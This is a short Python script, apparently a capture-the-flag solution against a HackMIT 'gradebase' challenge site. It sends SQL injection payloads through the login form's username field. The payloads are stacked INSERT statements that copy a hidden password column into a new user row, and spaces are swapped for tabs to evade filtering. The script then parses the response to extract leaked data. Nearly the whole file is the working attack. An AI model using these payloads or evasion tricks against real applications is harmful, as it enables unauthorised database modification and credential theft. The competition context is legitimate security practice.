# -*- coding: utf-8 -*-
import string
import random

import requests

# HINT:  Could not choose a best candidate operator. You might need to add explicit type casts.

# x = requests.post("https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/reset")
url = 'https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/login'
# data = {'username': 'Vivswan_5c6aaa'}
users = ["noam_chomsky", 'john_doe', 'elonos_mosquitos', 'melon_usk', 'Vivswan_5c6aaa']
columns = ['id', 'username', 'year', 'gender', 'favorite_color', 'password_66bc6bb8']


def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


username = get_random_string(6)
print(username)

data = {
    # 'username': "Vivswan_5c6aaa'; INSERT INTO user values (10, 'abc') --",
    # 'username': "Vivswan_5c6aaa'; INSERT INTO \"user\" values (10, 'abc', (SELECT column_name FROM information_schema.COLUMNS WHERE table_name = 'user' ",
    'username': f"Vivswan_5c6aaa'; INSERT INTO \"user\" values ({random.randint(10, 1111111111)}, (SELECT password_4dc2015a FROM \"user\" where password_4dc2015a IS NOT NULL)) --",
    'password': "%"
}

data['username'] = data['username'].replace(" ", " \t ")
x = requests.post(url, data=data)
print(x.text)

x = requests.post(url, data={'username': username})
for i in x.text.split("\n"):
    if i.__contains__("Year"):
        columns.append(i.replace("Year:", "").replace("<h5>", "").replace("</h5>", "").strip())
        print(columns)
